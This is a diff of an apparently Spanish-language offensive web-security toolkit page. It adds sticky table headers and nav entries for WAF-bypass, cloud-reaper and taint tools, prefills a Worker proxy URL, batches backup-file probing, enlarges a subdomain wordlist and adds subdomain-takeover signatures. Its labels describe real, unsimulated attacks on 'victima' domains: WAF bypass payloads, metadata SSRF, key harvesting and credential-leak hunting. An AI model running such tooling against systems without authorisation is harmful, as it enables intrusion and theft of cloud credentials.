@@ -2690,8 +2690,6 @@ a{color:inherit;text-decoration:none;}
 .modal-btn.cancel{background:transparent;color:var(--muted);border:1px solid var(--line);}
 .modal-btn.cancel:hover{color:var(--text);border-color:var(--muted);}
 .modal-timer{font-family:var(--mono);font-size:11px;color:rgba(255,26,46,.5);margin-top:16px;letter-spacing:.1em;}
-</style>
-<style>
 /* ══ WAF LAB — prefijo wl- (no colisiona con el resto del index) ══ */
 #waflab .wl-box{ background:#020005; border:1px solid rgba(255,26,46,.35); border-radius:4px; overflow:hidden; box-shadow:0 0 30px rgba(255,26,46,.08); margin-bottom:24px; }
 #waflab .wl-head{ background:rgba(255,26,46,.06); border-bottom:1px solid rgba(255,26,46,.2); padding:10px 16px; display:flex; align-items:center; justify-content:space-between; font-family:var(--mono); font-size:11px; letter-spacing:.06em; text-transform:uppercase; color:rgba(240,238,248,.75); }
@@ -2714,9 +2712,9 @@ a{color:inherit;text-decoration:none;}
 #waflab .wl-summary{ display:none; font-family:var(--mono); font-size:12px; line-height:1.8; background:rgba(0,255,163,.04); border:1px solid rgba(0,255,163,.2); border-radius:2px; padding:14px 16px; margin-bottom:14px; color:rgba(240,238,248,.85); }
 #waflab .wl-summary.show{ display:block; }
 #waflab .wl-summary b{ color:var(--green); }
-#waflab .wl-tablewrap{ overflow-x:auto; border:1px solid rgba(255,26,46,.12); border-radius:2px; }
+#waflab .wl-tablewrap{ overflow:auto; max-height:440px; border:1px solid rgba(255,26,46,.12); border-radius:2px; }
 #waflab table.wl-table{ width:100%; border-collapse:collapse; font-family:var(--mono); font-size:11px; }
-#waflab .wl-table th{ background:rgba(255,26,46,.05); color:rgba(255,26,46,.6); text-transform:uppercase; letter-spacing:.08em; font-size:10px; padding:9px 12px; text-align:left; border-bottom:1px solid rgba(255,26,46,.15); white-space:nowrap; }
+#waflab .wl-table th{ position:sticky;top:0;z-index:3; background:#0f0812; box-shadow:0 1px 0 rgba(255,26,46,.15); color:rgba(255,26,46,.6); text-transform:uppercase; letter-spacing:.08em; font-size:10px; padding:9px 12px; text-align:left; border-bottom:1px solid rgba(255,26,46,.15); white-space:nowrap; }
 #waflab .wl-table td{ padding:8px 12px; border-bottom:1px solid rgba(255,26,46,.05); color:rgba(240,238,248,.7); white-space:nowrap; }
 #waflab .wl-table td.v{ font-weight:700; }
 #waflab .wl-table .blk{ color:#ff5252; } #waflab .wl-table .byp{ color:#00ffa3; } #waflab .wl-table .mid{ color:#ffb020; }
@@ -2751,9 +2749,9 @@ a{color:inherit;text-decoration:none;}
 #nimbus .nb-stat span{ font-size:10px; text-transform:uppercase; letter-spacing:.08em; color:var(--muted); margin-left:5px; }
 #nimbus .nb-stat.hit b{ color:#00ffa3; }
 #nimbus .nb-export{ font-family:var(--mono); margin-top:10px; padding:8px 18px; background:var(--acc); color:#000; border:none; font-weight:700; cursor:pointer; border-radius:2px; }
-#nimbus .nb-tablewrap{ overflow-x:auto; border:1px solid rgba(255,26,46,.12); border-radius:2px; }
+#nimbus .nb-tablewrap{ overflow:auto; max-height:440px; border:1px solid rgba(255,26,46,.12); border-radius:2px; }
 #nimbus table.nb-table{ width:100%; border-collapse:collapse; font-family:var(--mono); font-size:11px; }
-#nimbus .nb-table th{ background:rgba(255,26,46,.05); color:rgba(255,26,46,.6); text-transform:uppercase; letter-spacing:.08em; font-size:10px; padding:9px 12px; text-align:left; border-bottom:1px solid rgba(255,26,46,.15); white-space:nowrap; }
+#nimbus .nb-table th{ position:sticky;top:0;z-index:3; background:#0f0812; box-shadow:0 1px 0 rgba(255,26,46,.15); color:rgba(255,26,46,.6); text-transform:uppercase; letter-spacing:.08em; font-size:10px; padding:9px 12px; text-align:left; border-bottom:1px solid rgba(255,26,46,.15); white-space:nowrap; }
 #nimbus .nb-table td{ padding:8px 12px; border-bottom:1px solid rgba(255,26,46,.05); color:rgba(240,238,248,.7); white-space:nowrap; }
 #nimbus .nb-table td.hit{ color:var(--acc); font-weight:700; }
 #nimbus .nb-table td.ok{ color:#00ffa3; }
@@ -2870,9 +2868,9 @@ a{color:inherit;text-decoration:none;}
 #taint .tr-stat.s b{ color:#00ffa3; }
 #taint .tr-export{ margin-left:auto; font-family:var(--mono); font-size:10px; letter-spacing:.08em; padding:8px 14px; background:transparent; color:var(--acc); border:1px solid rgba(255,26,46,.4); border-radius:2px; cursor:pointer; text-transform:uppercase; }
 #taint .tr-export:hover{ background:rgba(255,26,46,.08); }
-#taint .tr-tablewrap{ overflow-x:auto; }
+#taint .tr-tablewrap{ overflow:auto; max-height:440px; }
 #taint .tr-table{ width:100%; border-collapse:collapse; font-family:var(--mono); font-size:10.5px; }
-#taint .tr-table th{ text-align:left; padding:8px 10px; background:rgba(255,26,46,.05); border-bottom:1px solid var(--line); color:rgba(240,238,248,.6); font-size:9px; letter-spacing:.08em; text-transform:uppercase; }
+#taint .tr-table th{ position:sticky;top:0;z-index:3; background:#0f0812; text-align:left; padding:8px 10px; background:rgba(255,26,46,.05); border-bottom:1px solid var(--line); color:rgba(240,238,248,.6); font-size:9px; letter-spacing:.08em; text-transform:uppercase; }
 #taint .tr-table td{ padding:7px 10px; border-bottom:1px solid var(--line); color:rgba(240,238,248,.75); vertical-align:top; }
 #taint .tr-table td.v-crit{ color:#ff3355; font-weight:700; }
 #taint .tr-table td.v-high{ color:#ffb020; font-weight:700; }
@@ -3365,7 +3363,7 @@ a{color:inherit;text-decoration:none;}
       <div class="wl-head"><span class="wl-t">☠ waf_lab GOD MODE — 62 payloads · 8 oleadas · tamper engine · confirmación 8×8 · bypass real</span><span class="wl-dots"><i class="r"></i><i class="y"></i><i class="g"></i></span></div>
       <div class="wl-body">
         <div class="wl-row">
-          <input type="text" id="atkWorker" placeholder="tu-worker.tudelasec.workers.dev — sin https también entra">
+          <input type="text" id="atkWorker" value="https://scanner-proxy.matias-ramireztu.workers.dev" placeholder="tu-worker.tudelasec.workers.dev — sin https también entra">
           <input type="text" id="atkTarget" placeholder="victima.cl/search?q=test — dominio pelado, con www o sin: entra como sea">
           <input type="text" id="atkParam" value="q" style="max-width:80px;flex:0 1 80px" title="parámetro de inyección">
           <button id="runAttack">☠ EMPEZAR ATAQUE</button>
@@ -3388,14 +3386,14 @@ a{color:inherit;text-decoration:none;}
     <h2 class="sec-title h2-anim" data-l1="NIMBUS" data-l2="Cloud Reaper." aria-label="NIMBUS Cloud Reaper."></h2>
 
     <div class="nb-box">
-      <div class="nb-head"><span class="nb-t">🌩 nimbus cloud reaper v2 — aws · azure · gcp · firebase · shopify · k8s/docker/registry · metadata ssrf · cname takeover · buckets publicos · 9 oleadas</span><span class="nb-dots"><i class="r"></i><i class="y"></i><i class="g"></i></span></div>
+      <div class="nb-head"><span class="nb-t">🌩 nimbus cloud reaper v3 reaper xtreme — aws · azure · gcp · firebase · shopify · k8s/docker/registry · metadata ssrf (39 endpoints) · cname takeover (38 servicios) · multi-cloud enum (do/oci/alibaba/wasabi/linode/scaleway/ibm) · creds leak hunt · cosecha de llaves · 11 oleadas</span><span class="nb-dots"><i class="r"></i><i class="y"></i><i class="g"></i></span></div>
       <div class="nb-body">
         <div class="nb-row">
           <input type="text" id="nbTarget" placeholder="victima.cl (dominio o URL del target)">
           <button id="nbRun">🌩 DESATAR NIMBUS</button>
         </div>
         <div class="nb-progress"><i id="nbFill"></i></div>
-        <div class="nb-log" id="nbLog"><span class="t">// ingresa el dominio del target y presiona DESATAR NIMBUS — 9 oleadas cloud reales: fingerprint multi-provider → S3/Azure/GCP/Firebase enum → Shopify attack surface → metadata SSRF → K8s/Docker/Registry → CNAME takeover via DoH → buckets takeover → reporte JSON. Todo HTTP real via el Worker proxy, cero simulación.</span></div>
+        <div class="nb-log" id="nbLog"><span class="t">// ingresa el dominio del target y presiona DESATAR NIMBUS — 11 oleadas cloud reales: fingerprint multi-provider (30) + cosecha de llaves → S3 (regiones+ACL+perms) / Azure / GCP/Firebase enum → Shopify attack surface → metadata SSRF (39 endpoints x params reflejados) → K8s/Docker/Registry → CNAME takeover via DoH (38 servicios) → multi-cloud enum (DO/OCI/Alibaba/Wasabi/Linode/Scaleway/IBM) → cloud creds leak hunt (.env/serviceAccount/tfstate/dumps) → reporte JSON + PDF. Todo HTTP real via el Worker proxy, cero simulación.</span></div>
         <div class="nb-summary" id="nbSummary"></div>
         <div class="nb-tablewrap"><table class="nb-table">
           <thead><tr><th>OLEADA</th><th>FASE</th><th>PROBE</th><th>STATUS</th><th>VEREDICTO</th></tr></thead>
@@ -11646,6 +11644,9 @@ var NAV_ITEMS = [
  {id:'habilidades',  icon:'\uD83C\uDFAF', label:'Skills & Areas'},
  {id:'scanner',      icon:'\uD83D\uDC80', label:'Leviatan Scanner'},
  {id:'osint',        icon:'\u2316',        label:'OSINT Lookup'},
+ {id:'waflab',       icon:'\u2620',        label:'WAF Lab Xtreme'},
+ {id:'nimbus',       icon:'\u2601',        label:'Nimbus Cloud Reaper'},
+ {id:'taint',        icon:'\u2623',        label:'Taint Radar Zero-Trust'},
  {id:'crawler',      icon:'\uD83D\uDD78',  label:'Endpoint Crawler'},
  {id:'kraken',       icon:'\uD83D\uDC19',  label:'Kraken Subdomains'},
  {id:'cerberus',     icon:'\uD83D\uDC3A',  label:'Cerberus Fuzzer'},
@@ -17437,8 +17438,16 @@ var wordlist=['admin','login','api','config','test','dev','staging','backup','ol
 var wlExtensions=['','.bak','.old','.orig','.backup','.copy','.tmp','.save','.txt','.json','.xml','.yaml','.yml','.html','.php','.aspx','.jsp','.env','.config','.conf','.ini'];
 var wlFound=0;var wlTotal=0;
 var wlBaseLen=S.body?S.body.length:0;
-for(var wl=0;wl<wordlist.length;wl++){for(var wle=0;wle<wlExtensions.length&&wle<6;wle++){var wlPath='/'+wordlist[wl]+wlExtensions[wle];wlTotal++;var rwl=await get(target+wlPath);
-if(rwl.status===200&&rwl.body&&rwl.body.length>50&&rwl.body.length!==wlBaseLen){wlFound++;logInfo('[200] '+wlPath+' ('+rwl.body.length+'b)');if(wlExtensions[wle]&&/\.bak|\.old|\.orig|\.backup|\.env/.test(wlExtensions[wle])){logErr('BACKUP ENCONTRADO: '+wlPath);addF('high','Path backup: '+wlPath,'Archivo de backup accesible');markCrit('p100');}}await sl(5);}}
+/* FIX #25: antes este bloque era 2.748-3.102 gets SECUENCIALES (la colgada historica de F100). */
+var wlCombos=[];var wlSeen={};
+for(var wlc=0;wlc<wordlist.length;wlc++){for(var wle=0;wle<wlExtensions.length&&wle<6;wle++){var wlPath='/'+wordlist[wlc]+wlExtensions[wle];if(!wlSeen[wlPath]){wlSeen[wlPath]=1;wlCombos.push({p:wlPath,e:wlExtensions[wle]});}}}
+wlTotal=wlCombos.length;
+for(var wl0=0;wl0<wlCombos.length;wl0+=24){var wlBatch=[];
+for(var wlb=0;wlb<24&&wl0+wlb<wlCombos.length;wlb++)wlBatch.push(target+wlCombos[wl0+wlb].p);
+var wlRes=await batch(wlBatch);
+wlRes.forEach(function(wr,widx){var wc=wlCombos[wl0+widx];if(!wc)return;
+if(wr.status==='fulfilled'&&wr.value&&wr.value.status===200&&wr.value.body&&wr.value.body.length>50&&wr.value.body.length!==wlBaseLen){wlFound++;logInfo('[200] '+wc.p+' ('+wr.value.body.length+'b)');if(wc.e&&/\.bak|\.old|\.orig|\.backup|\.env/.test(wc.e)){logErr('BACKUP ENCONTRADO: '+wc.p);addF('high','Path backup: '+wc.p,'Archivo de backup accesible');markCrit('p100');}}});
+await sl(10);}
 if(wlFound>10){logWarn(wlFound+' paths descubiertos via wordlist — superficie masiva');addF('med','Wordlist: '+wlFound+' paths encontrados','Superficie de ataque expandida significativamente');}
 else if(wlFound>0)logWarn('Wordlist: '+wlFound+' paths encontrados');
 logOk('Adaptive wordlist: '+wlTotal+' combinaciones probadas, '+wlFound+' encontradas');
@@ -23030,7 +23039,7 @@ const DOH_PROVIDERS = [
 const dohRR  = { i: 0 };
 const dohStats = { G: { ok: 0, fail: 0 }, CF: { ok: 0, fail: 0 } };
 
-const WORDLIST = ['www','mail','ftp','admin','portal','api','dev','test','stage','staging','beta','demo','app','apps','old','new','backup','bak','db','sql','cpanel','webmail','smtp','pop','imap','ns1','ns2','vpn','remote','git','svn','jenkins','ci','cd','build','sso','auth','login','secure','shop','store','cart','pay','payment','billing','cms','wp','wordpress','blog','news','forum','wiki','docs','doc','help','support','status','monitor','grafana','kibana','elastic','logs','log','metrics','prometheus','cdn','assets','static','img','images','media','video','files','download','uploads','s3','storage','bucket','cloud','aws','azure','gcp','k8s','kube','docker','registry','internal','intranet','corp','office','exchange','owa','lync','skype','teams','crm','erp','hr','it','support2','qa','uat','sandbox','prod','production','edge','gateway','gw','proxy','lb','loadbalancer','firewall','fw','router','switch','wifi','wireless','hotspot','guest','iot','camera','cctv','printer','scan','fax','voip','sip','pbx','meet','conference','webinar','live','stream','radio','tv','chat','im','xmpp','irc','matrix','mattermost','rocketchat','gitlab','bitbucket','jira','confluence','trello','asana','notion','slack','zoom','hub','lab','labs','research','ai','ml','nlp','bot','bots','api2','api-v2','v1','v2','v3','mobile','android','ios','m','mobile-api','graphql','rest','soap','rpc','grpc','ws','wss','socket','push','notify','notifications','email','mailer','campaign','marketing','seo','ads','analytics','stats','tracking','pixel','tag','tags','affiliate','partner','partners','reseller','client','clients','customer','customers','user','users','account','accounts','profile','profiles','panel','dashboard','console','control','manage','manager','admin2','root','sys','system','ops','devops','secops','soc','pentest','audit','compliance','legal','finance','accounting','invoice','invoices','report','reports','bi','etl','dwh','warehouse','queue','mq','cache','redis','memcached','session','sessions','token','tokens','key','keys','cert','certs','pki','ca','saml','oauth','oidc','ad','ldap','dns','dhcp','ntp','tftp','snmp','syslog','rsyslog','elk','siem','waf','ids','ips','honey','honeypot','canary','decoy','archive','legacy','vps','srv','server','node','cluster','master','slave','worker','queue2','jobs','cron','scheduler','temp','tmp','trash','deleted','deprecated','alpha','gamma','delta','omega','kappa','lambda','sigma','omega2','test2','tests','testing','debug','trace','verbose','beta2','rc','release','snapshot','nightly','feature','hotfix','patch','upgrade','migrate','migration','maintenance','health','healthz','ready','readyz','live2','heartbeat','ping','echo','metrics2','actuator','swagger','openapi','docs-api','redoc','postman','insomnia','mock','stub','fake','sandbox2','playground','demo2','sample','example','examples','template','templates','theme','themes','plugin','plugins','module','modules','widget','widgets','iframe','embed','share','short','shorturl','redirect','redir','go','link','links','url','urls','qr','sitemap','robots','favicon','apple','google','facebook','twitter','instagram','linkedin','youtube','tiktok','pinterest','snapchat','telegram','whatsapp','signal','discord','reddit','medium','substack','patreon','github','gitlab2','stackoverflow',/* XTREME v3: +150 palabras de caza profunda */'preprod','pre','prod2','production2','aws2','azure2','gcp2','office365','owa2','autodiscover','exchange2','msexchange','lync2','skype2','adfs','sts','idp','shibboleth','cas','oauth2','sso2','keycloak','auth2','login2','signin','signup','register','onboard','vault2','consul2','nomad2','rancher','openshift','ocp','kubernetes2','k8s2','helm','chartmuseum','minio','harbor','quay','artifactory','nexus','nexus3','sonarqube','sonar','gitlab-ci','runner','git2','repo','repos','svn2','hg','mercurial','gerrit','phabricator','rabbitmq','amqp2','activemq','kafka2','zookeeper','cassandra','couchdb','couchbase','neo4j','influxdb','clickhouse','click','timescale','postgres','postgresql','pgsql','mysql2','mariadb','percona','phpmyadmin','adminer','pgadmin','pgadmin4','solr','elastic2','elasticsearch','opensearch','logstash','filebeat','telegraf','influx','nagios','zabbix','icinga','checkmk','librenms','prtg','datadog2','sentry2','glitchtip','bugsnag2','php','php7','php8','laravel','symfony','codeigniter','django','flask','rails','puma','unicorn','gunicorn','uwsgi','tomcat','tomcat2','jboss','wildfly','websphere','weblogic','glassfish','jetty','resin','iis','iis2','kestrel','dotnet','dotnetcore','java','java2','jvm','struts','spring','springboot','api-docs','apidocs','swagger2','swagger-ui','openapi2','graphql2','hasura','prisma','dgraph','neo','redis2','memcached2','memcache','varnish','nginx','nginx2','apache','apache2','httpd','caddy','traefik','traefik2','envoy','kong','kong2','apigw','apigateway','api-gateway','apiman','istio','linkerd','weave','calico','flannel','env','environments','environment','staging2','stg','stg2','int','integration','integ','acc','acceptance','demo3','training','trainee','sandbox3','play','playground2','experimental','experiment','labs2','research2','rd','r-and-d','science','sci','ml2','mlflow','jupyter','notebook','notebooks','tensorboard','gpu','cuda','ai2','gpt','llm','chatbot','chat2','assistant','bot2','slack2','teams2','hangouts','meet2','zoom2','webex','gotomeeting','voip2','freepbx','asterisk','3cx','elastix','issabel','mikrotik','fortinet','fortigate','paloalto','pfsense','opnsense','endian','sofaware','watchguard','checkpoint','cisco','asa','pix','juniper','netscreen','sonicwall','sophos','barracuda','zyxel','huawei','h3c','dr','drsite','failover','ha','haproxy','keepalived','pacemaker','corosync','secondary','mirror','mirror2','replica','readonly','read-only','write','writer','reader','primary','master2','slave2','worker2','node2','node3','core','core2','central','hub2','gateway2','gw2','edge2','cdn2','static2','assets2','media2','img2','images2','video2','files2','download2','dl','ftp2','sftp2','tftp2','rsync','bacula','veeam','veeam2','commvault','netbackup','backup2','bak2','old2','legacy2','archive2','deprecated2','trash2','deleted2','migration2','maintenance2','upgrade2','hotfix2','patch2','beta3','alpha2','canary2','nightly2','ci2','cd2','build2','builder','compile','package','packager','dist','release2','releases','snapshots','tags2','tags3','corp','company','group','holdings','partners','network','sys','system','systems','infra','infrastructure','platform','svc','service','services','web1','web2','www2','www3','shop','store','tienda','comercio','pagos','payment','payments','billing','invoice','facturacion','checkout','cart','pos','sucursal','branch','clientes','customers','crm','erp','sap','odoo','business','b2b','b2c','marketplace','fintech','bank','banco','banca','banking','wallet2','pay','invest','inversion','trading','trade','exchange','cripto','crypto','nft','blockchain','ledger','node4','cluster','kube','container','docker','registry2','pipeline','deploy','deployment','releases2','bitbucket','tfs','devops','ops','sre','secops','soc','siem','soar','edr','xdr','mdr','nessus','qualys','tenable','rapid7','metasploit','burp','pentest','redteam','blueteam','ctf','hacklab','infosec','cyber','cybersec','zero','zerotrust'];
+const WORDLIST = ['www','mail','ftp','admin','portal','api','dev','test','stage','staging','beta','demo','app','apps','old','new','backup','bak','db','sql','cpanel','webmail','smtp','pop','imap','ns1','ns2','vpn','remote','git','svn','jenkins','ci','cd','build','sso','auth','login','secure','shop','store','cart','pay','payment','billing','cms','wp','wordpress','blog','news','forum','wiki','docs','doc','help','support','status','monitor','grafana','kibana','elastic','logs','log','metrics','prometheus','cdn','assets','static','img','images','media','video','files','download','uploads','s3','storage','bucket','cloud','aws','azure','gcp','k8s','kube','docker','registry','internal','intranet','corp','office','exchange','owa','lync','skype','teams','crm','erp','hr','it','support2','qa','uat','sandbox','prod','production','edge','gateway','gw','proxy','lb','loadbalancer','firewall','fw','router','switch','wifi','wireless','hotspot','guest','iot','camera','cctv','printer','scan','fax','voip','sip','pbx','meet','conference','webinar','live','stream','radio','tv','chat','im','xmpp','irc','matrix','mattermost','rocketchat','gitlab','bitbucket','jira','confluence','trello','asana','notion','slack','zoom','hub','lab','labs','research','ai','ml','nlp','bot','bots','api2','api-v2','v1','v2','v3','mobile','android','ios','m','mobile-api','graphql','rest','soap','rpc','grpc','ws','wss','socket','push','notify','notifications','email','mailer','campaign','marketing','seo','ads','analytics','stats','tracking','pixel','tag','tags','affiliate','partner','partners','reseller','client','clients','customer','customers','user','users','account','accounts','profile','profiles','panel','dashboard','console','control','manage','manager','admin2','root','sys','system','ops','devops','secops','soc','pentest','audit','compliance','legal','finance','accounting','invoice','invoices','report','reports','bi','etl','dwh','warehouse','queue','mq','cache','redis','memcached','session','sessions','token','tokens','key','keys','cert','certs','pki','ca','saml','oauth','oidc','ad','ldap','dns','dhcp','ntp','tftp','snmp','syslog','rsyslog','elk','siem','waf','ids','ips','honey','honeypot','canary','decoy','archive','legacy','vps','srv','server','node','cluster','master','slave','worker','queue2','jobs','cron','scheduler','temp','tmp','trash','deleted','deprecated','alpha','gamma','delta','omega','kappa','lambda','sigma','omega2','test2','tests','testing','debug','trace','verbose','beta2','rc','release','snapshot','nightly','feature','hotfix','patch','upgrade','migrate','migration','maintenance','health','healthz','ready','readyz','live2','heartbeat','ping','echo','metrics2','actuator','swagger','openapi','docs-api','redoc','postman','insomnia','mock','stub','fake','sandbox2','playground','demo2','sample','example','examples','template','templates','theme','themes','plugin','plugins','module','modules','widget','widgets','iframe','embed','share','short','shorturl','redirect','redir','go','link','links','url','urls','qr','sitemap','robots','favicon','apple','google','facebook','twitter','instagram','linkedin','youtube','tiktok','pinterest','snapchat','telegram','whatsapp','signal','discord','reddit','medium','substack','patreon','github','gitlab2','stackoverflow',/* XTREME v3: +150 palabras de caza profunda */'preprod','pre','prod2','production2','aws2','azure2','gcp2','office365','owa2','autodiscover','exchange2','msexchange','lync2','skype2','adfs','sts','idp','shibboleth','cas','oauth2','sso2','keycloak','auth2','login2','signin','signup','register','onboard','vault2','consul2','nomad2','rancher','openshift','ocp','kubernetes2','k8s2','helm','chartmuseum','minio','harbor','quay','artifactory','nexus','nexus3','sonarqube','sonar','gitlab-ci','runner','git2','repo','repos','svn2','hg','mercurial','gerrit','phabricator','rabbitmq','amqp2','activemq','kafka2','zookeeper','cassandra','couchdb','couchbase','neo4j','influxdb','clickhouse','click','timescale','postgres','postgresql','pgsql','mysql2','mariadb','percona','phpmyadmin','adminer','pgadmin','pgadmin4','solr','elastic2','elasticsearch','opensearch','logstash','filebeat','telegraf','influx','nagios','zabbix','icinga','checkmk','librenms','prtg','datadog2','sentry2','glitchtip','bugsnag2','php','php7','php8','laravel','symfony','codeigniter','django','flask','rails','puma','unicorn','gunicorn','uwsgi','tomcat','tomcat2','jboss','wildfly','websphere','weblogic','glassfish','jetty','resin','iis','iis2','kestrel','dotnet','dotnetcore','java','java2','jvm','struts','spring','springboot','api-docs','apidocs','swagger2','swagger-ui','openapi2','graphql2','hasura','prisma','dgraph','neo','redis2','memcached2','memcache','varnish','nginx','nginx2','apache','apache2','httpd','caddy','traefik','traefik2','envoy','kong','kong2','apigw','apigateway','api-gateway','apiman','istio','linkerd','weave','calico','flannel','env','environments','environment','staging2','stg','stg2','int','integration','integ','acc','acceptance','demo3','training','trainee','sandbox3','play','playground2','experimental','experiment','labs2','research2','rd','r-and-d','science','sci','ml2','mlflow','jupyter','notebook','notebooks','tensorboard','gpu','cuda','ai2','gpt','llm','chatbot','chat2','assistant','bot2','slack2','teams2','hangouts','meet2','zoom2','webex','gotomeeting','voip2','freepbx','asterisk','3cx','elastix','issabel','mikrotik','fortinet','fortigate','paloalto','pfsense','opnsense','endian','sofaware','watchguard','checkpoint','cisco','asa','pix','juniper','netscreen','sonicwall','sophos','barracuda','zyxel','huawei','h3c','dr','drsite','failover','ha','haproxy','keepalived','pacemaker','corosync','secondary','mirror','mirror2','replica','readonly','read-only','write','writer','reader','primary','master2','slave2','worker2','node2','node3','core','core2','central','hub2','gateway2','gw2','edge2','cdn2','static2','assets2','media2','img2','images2','video2','files2','download2','dl','ftp2','sftp2','tftp2','rsync','bacula','veeam','veeam2','commvault','netbackup','backup2','bak2','old2','legacy2','archive2','deprecated2','trash2','deleted2','migration2','maintenance2','upgrade2','hotfix2','patch2','beta3','alpha2','canary2','nightly2','ci2','cd2','build2','builder','compile','package','packager','dist','release2','releases','snapshots','tags2','tags3','corp','company','group','holdings','partners','network','sys','system','systems','infra','infrastructure','platform','svc','service','services','web1','web2','www2','www3','shop','store','tienda','comercio','pagos','payment','payments','billing','invoice','facturacion','checkout','cart','pos','sucursal','branch','clientes','customers','crm','erp','sap','odoo','business','b2b','b2c','marketplace','fintech','bank','banco','banca','banking','wallet2','pay','invest','inversion','trading','trade','exchange','cripto','crypto','nft','blockchain','ledger','node4','cluster','kube','container','docker','registry2','pipeline','deploy','deployment','releases2','bitbucket','tfs','devops','ops','sre','secops','soc','siem','soar','edr','xdr','mdr','nessus','qualys','tenable','rapid7','metasploit','burp','pentest','redteam','blueteam','ctf','hacklab','infosec','cyber','cybersec','zero','zerotrust','es','en','de','fr','it','mx','ar','cl','co','pe','br','bo','ec','py','uy','ve','latam','chile','peru','colombia','mexico','argentina','brazil','espana','santiago','lima','bogota','conce','valpo','antofa','iquique','rancagua','talca','temuco','gob','gobierno','ministerio','minvu','minsal','mineduc','mindef','sii','previred','fonasa','afp','ips','aduana','seremi','municipio','alcaldia','tribunal','contraloria','bcentral','salud','hospital','clinica','farmacia','covid','covid19','vacuna','urgencia','bancochile','bci','itau','santander2','falabella','ripley','paris','lapolar','tottus','cencosud','jumbo','sodimac','mercadopago','webpay','transbank','khipu','tesoreria','factura','dte','bolsa','valores','divisa','billetera','transfer','cobros','api3','apiold','apiv2','apiv3','apigw','v5','v6','v9','dev3','devold','devel','devtest','devstage','test3','qa2','qa3','uat2','stg3','stage3','preprod2','prelive','warm','canary3','shadow','mirror3','shard','shard1','shard2','mqtt','stomp','grpc2','restapi','bff','backend','backend2','frontend','front2','ssr','cdn3','akamai','cloudflare2','incapsula','sucuri','imperva','netscaler','bigip','sonarqube2','git3','svn2','perforce','codereview','merge','commit','branch','feature','features','flag','flags','config','configs','settings','prefs','profiles','accounts2','members','staff','rrhh','empleados','empleo','careers','postula','corporate','holding2','partner3','reseller','distribuidor','proveedor','vendor','supplier','compras','logistica','supply','supplychain','fleet','bodega','despacho','envios','shipping','tracking','pedido','ordenes','checkout2','carrito','catalogo','producto','precios','marketing3','campana','leads','ventas','sales','kpi','kpis','telemetry','apm','obs','tracing','opentelemetry','jaeger','loki','auditoria','compliance','sox','iso27001','gdpr','hipaa','pci','accesslog','sqlconsole','webshell','exploits','phishing','spoof','socks5','tor2','openvpn','wireguard','ipsec','radius2','tacacs','kerberos','ldap3','ldaps','samba','nfs','smb','cifs','sysvol','ocsp','crl','csr','pem','pfx','jks','keystore','hsm','seed','seeds','wallet3','web3','rpc2','beacon','validator','mining','stratum','alibaba','tencent','huawei2','oracle2','ibm','digitalocean','hetzner','ovh','contabo','vultr','linode2','kamatera','upcloud','heroku2','railway','glitch','deno','replit','redteam','blueteam','purpleteam','threathunt','threatmodel','zeroday','exploitdb','metasploit2','cobalt','sliver','havoc','mythic','pwndbg','ghidra','rizin','yara','sigma','zeek','wireshark','tcpdump','nmap','masscan','zmap','amass','subfinder','httpx','nuclei','ffuf','gobuster','dirsearch','feroxbuster','naabu','shuffledns','dalfox','commix','sqlmap2','nosqlmap','arjun','wafw00f','nikto','whatweb','burpsuite2','owasp','cve','mitre','attack','hydra','medusa2','john','hashcat2','cypress','playwright','selenium','puppeteer','vitest','jest','vite','esbuild','swc','rollup','webpack','fastapi','django2','spring2','laravel2','poetry','gradle','maven','bazel','trino','snowflake','bigquery2','airflow','prefect','dagster','superset','metabase','redash','prometheus2','zabbix2','splunk','opensearch2','appdynamics','dynatrace','alertmanager','victoriametrics','mimir','istio2','envoy2','haproxy3','traefik3','caddy2','nginx3','apache3','tomcat3','jetty3','unicorn2','gunicorn2','puma2','docker2','podman','containerd','trivy','grype','syft2','cosign','sigstore','notary','sbom','cyclonedx','osv','nvd','hackerone','bugcrowd','intigriti','yeswehack','synack','packetstorm'];
 
 const OSINT_SOURCES = [
   { id: 'crtsh',    label: 'Certificate Transparency', url: t => 'https://crt.sh/?q=%25.' + t + '&output=json', timeout: 35000 },
@@ -23048,6 +23057,10 @@ const OSINT_SOURCES = [
   { id: 'robtex',     label: 'Robtex PDNS',     url: t => 'https://freeapi.robtex.com/pdns/forward/' + t },
   /* XTREME: BufferOver ya no es solo fallback crt.sh — corre SIEMPRE (la API tls.bufferover.run es gratis y rapida) */
   { id: 'sublist3r', label: 'Sublist3r API', url: t => 'https://api.sublist3r.com/search?q=' + t },
+  { id: 'omnisint',     label: 'Rapid7 Sonar',          url: t => 'https://sonar.omnisint.io/subdomains/' + t, timeout: 20000 },
+  { id: 'otxurls',       label: 'OTX URL List',           url: t => 'https://otx.alienvault.com/api/v1/indicators/domain/' + t + '/url_list?limit=500' },
+  { id: 'ddgsearch',    label: 'DuckDuckGo (buscador)', url: t => 'https://html.duckduckgo.com/html/?q=site%3A*.' + t },
+  { id: 'bingsearch',   label: 'Bing (buscador)',       url: t => 'https://www.bing.com/search?q=site%3A*.' + t + '&count=100' },
   { id: 'bufferover', label: 'BufferOver TLS', url: t => 'https://tls.bufferover.run/dns?q=.' + t }
 ];
 
@@ -23116,7 +23129,20 @@ const TAKEOVER_FP = [
   { p: /(^|\.)freshdesk\.com$/i,                   c: 'FreshDesk',         b: [/The page you requested could not be found/i] },
   { p: /(^|\.)freshservice\.com$/i,                c: 'FreshService',      b: [/Portal not found/i] },
   { p: /(^|\.)hatenablog\.com$/i,                  c: 'HatenaBlog',        b: [/404 Blog Not Found/i] },
-  { p: /(^|\.)zerigo\.com$/i,                      c: 'Zerigo',             b: [/The page you tried to access does not exist/i] }
+  { p: /(^|\.)zerigo\.com$/i,                      c: 'Zerigo',             b: [/The page you tried to access does not exist/i] },
+  /* v4 (sesión 24): +12 firmas modernas */
+  { p: /(^|\.)ngrok(-free)?\.app$/i,               c: 'Ngrok v2',           b: [/Tunnel [\w.-]+ not found/i] },
+  { p: /(^|\.)azurestaticapps\.net$/i,            c: 'Azure Static Web',  b: [/Content not found/i] },
+  { p: /(^|\.)cloudapp\.azure\.com$/i,           c: 'Azure CloudApp v2',  b: [/404 Web Site not found/i] },
+  { p: /(^|\.)fastlylb\.net$/i,                   c: 'Fastly LB',          b: [/Fastly error:\s*unknown domain/i] },
+  { p: /(^|\.)s3(-external-1|-dualstack)[\w.-]*\.amazonaws\.com$/i, c: 'AWS S3 Ext', b: [/NoSuchBucket/i, /The specified bucket does not exist/i] },
+  { p: /(^|\.)storage\.googleapis\.com$/i,       c: 'GCS Bucket',        b: [/NoSuchBucket/i, /The specified bucket does not exist/i] },
